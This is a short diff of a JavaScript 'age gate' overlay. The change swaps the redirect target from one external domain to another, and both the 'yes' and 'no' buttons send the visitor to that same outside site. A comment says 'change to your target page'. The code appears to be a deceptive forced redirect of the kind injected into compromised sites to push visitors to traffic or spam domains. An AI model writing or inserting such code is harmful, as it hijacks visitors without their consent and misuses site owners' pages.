@@ -86,11 +86,11 @@ if(form){
   bd.style.display='flex';
   function closeGate(){ bd.style.display='none'; bd.remove(); }
   bd.querySelector('#age-yes').addEventListener('click', function(){
-    window.location.href = " https://trafficedge.site"; // change to your target page
+    window.location.href = " https://rankshift.site/"; // change to your target page
   });
                                                 
   bd.querySelector('#age-no').addEventListener('click', function(){
-    window.location.href = " https://trafficedge.site"; // change to your target page
+    window.location.href = " https://rankshift.site/"; // change to your target page
   });
  
 })();
